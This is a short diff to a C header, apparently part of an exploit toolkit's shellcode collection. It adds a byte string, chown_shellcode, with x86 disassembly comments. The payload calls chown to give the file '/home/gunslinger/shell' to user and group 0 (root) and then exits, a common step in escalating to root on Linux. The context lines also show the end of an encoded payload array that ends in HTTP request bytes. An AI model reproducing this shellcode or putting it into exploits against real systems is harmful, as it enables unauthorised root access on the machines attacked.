@@ -696,4 +696,28 @@ char alpha_mixed_32bits[] = {
 0x54, 0x50, 0x2f, 0x31, 0x2e, 0x30, 0x0d, 0x0a, 
 0x0d, 0x0a };
 
+
+
+char *chown_shellcode=
+		"\xeb\x13"                    /* jmp    0x8048075 */
+		"\x31\xc0"                    /* xor    %eax,%eax */
+		"\xb0\xb6"                    /* mov    $0xb6,%al */
+		"\x5b"                        /* pop    %ebx */
+		"\x31\xc9"                    /* xor    %ecx,%ecx */
+		"\x31\xd2"                    /* xor    %edx,%edx */
+		"\xcd\x80"                    /* int    $0x80 */
+		"\x31\xc0"                    /* xor    %eax,%eax */
+		"\xb0\x01"                    /* mov    $0x1,%al */
+		"\x31\xdb"                    /* xor    %ebx,%ebx */
+		"\xcd\x80"                    /* int    $0x80 */
+		"\xe8\xe8\xff\xff\xff"        /* call   0x8048062 */
+		"\x2f"                        /* das     */
+		"\x68\x6f\x6d\x65\x2f"        /* push   $0x2f656d6f */
+		"\x67\x75\x6e"                /* addr16 jne 0x80480f1 */
+		"\x73\x6c"                    /* jae    0x80480f1 */
+		"\x69\x6e\x67\x65\x72\x2f\x73"/* imul   $0x732f7265,0x67(%esi),%ebp */
+		"\x68"                        /* .byte 0x68 */
+		"\x65"                        /* gs */
+		"\x6c"                        /* insb   (%dx),%es		"(%edi) */
+		"\x6c";                       /* insb   (%dx),%es		"(%edi) */
 #endif
